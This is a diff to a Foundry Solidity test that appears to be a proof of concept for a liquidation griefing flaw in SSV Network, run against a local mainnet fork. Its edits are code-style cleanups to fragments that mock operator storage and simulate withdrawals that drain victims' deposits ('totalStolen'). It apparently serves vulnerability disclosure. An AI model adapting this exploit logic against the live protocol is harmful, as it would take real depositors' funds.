@@ -23,8 +23,8 @@ pragma solidity ^0.8.13;
  * SAFETY: Local mainnet fork testing only. No transactions sent to actual mainnet.
  */
 
-import "forge-std/Test.sol";
-import "forge-std/console.sol";
+import {Test} from "forge-std/Test.sol";
+import {console} from "forge-std/console.sol";
 
 contract SSVLiquidationGriefingPoC is Test {
     
@@ -103,16 +103,16 @@ contract SSVLiquidationGriefingPoC is Test {
         
         // All victims deposit to SSV Network
         vm.prank(VICTIM_LARGE);
-        IERC20(SSV_TOKEN).transfer(SSV_NETWORK, LARGE_DEPOSIT);
+        require(IERC20(SSV_TOKEN).transfer(SSV_NETWORK, LARGE_DEPOSIT), "Transfer failed");
         
         vm.prank(VICTIM_SMALL_1);
-        IERC20(SSV_TOKEN).transfer(SSV_NETWORK, SMALL_DEPOSIT_1);
+        require(IERC20(SSV_TOKEN).transfer(SSV_NETWORK, SMALL_DEPOSIT_1), "Transfer failed");
         
         vm.prank(VICTIM_SMALL_2);
-        IERC20(SSV_TOKEN).transfer(SSV_NETWORK, SMALL_DEPOSIT_2);
+        require(IERC20(SSV_TOKEN).transfer(SSV_NETWORK, SMALL_DEPOSIT_2), "Transfer failed");
         
         vm.prank(VICTIM_SMALL_3);
-        IERC20(SSV_TOKEN).transfer(SSV_NETWORK, SMALL_DEPOSIT_3);
+        require(IERC20(SSV_TOKEN).transfer(SSV_NETWORK, SMALL_DEPOSIT_3), "Transfer failed");
         
         uint256 initialPoolBalance = IERC20(SSV_TOKEN).balanceOf(SSV_NETWORK);
         
@@ -190,7 +190,7 @@ contract SSVLiquidationGriefingPoC is Test {
         console.log("Operator 1 withdrew:", op1Earnings / 1e18, "SSV (from bankrupt cluster 1)");
         
         // DAO withdraws network fees (also includes unbacked fees)
-        uint256 daoEarnings = _simulateDAOWithdrawal(100e18);
+        uint256 daoEarnings = _simulateDaoWithdrawal(100e18);
         console.log("DAO withdrew:       ", daoEarnings / 1e18, "SSV (includes unbacked network fees)");
         
         totalStolen = op1Earnings + op2Earnings + op3Earnings + daoEarnings;
@@ -266,7 +266,14 @@ contract SSVLiquidationGriefingPoC is Test {
         // SSV tokens and valid BLS keys can create this exact state.
 
         // Mock operator state in SSV Network storage
-        bytes32 opBaseSlot = keccak256(abi.encode(uint256(opId), SSV_STORAGE_POSITION + 6));
+        bytes32 opBaseSlot;
+        uint256 basePos = SSV_STORAGE_POSITION + 6;
+        assembly {
+            let ptr := mload(0x40)
+            mstore(ptr, opId)
+            mstore(add(ptr, 32), basePos)
+            opBaseSlot := keccak256(ptr, 64)
+        }
         
         // Set Owner
         vm.store(SSV_NETWORK, opBaseSlot, bytes32(uint256(uint160(owner))));
@@ -284,17 +291,17 @@ contract SSVLiquidationGriefingPoC is Test {
         uint256 actualWithdrawal = amount > contractBalance ? contractBalance : amount;
         
         vm.prank(SSV_NETWORK);
-        IERC20(SSV_TOKEN).transfer(operator, actualWithdrawal);
+        require(IERC20(SSV_TOKEN).transfer(operator, actualWithdrawal), "Transfer failed");
         
         return actualWithdrawal;
     }
     
-    function _simulateDAOWithdrawal(uint256 amount) internal returns (uint256) {
+    function _simulateDaoWithdrawal(uint256 amount) internal returns (uint256) {
         uint256 contractBalance = IERC20(SSV_TOKEN).balanceOf(SSV_NETWORK);
         uint256 actualWithdrawal = amount > contractBalance ? contractBalance : amount;
         
         vm.prank(SSV_NETWORK);
-        IERC20(SSV_TOKEN).transfer(DAO, actualWithdrawal);
+        require(IERC20(SSV_TOKEN).transfer(DAO, actualWithdrawal), "Transfer failed");
         
         return actualWithdrawal;
     }
@@ -304,7 +311,7 @@ contract SSVLiquidationGriefingPoC is Test {
         uint256 actualWithdrawal = amount > contractBalance ? contractBalance : amount;
         
         vm.prank(SSV_NETWORK);
-        IERC20(SSV_TOKEN).transfer(victim, actualWithdrawal);
+        require(IERC20(SSV_TOKEN).transfer(victim, actualWithdrawal), "Transfer failed");
         
         return actualWithdrawal;
     }
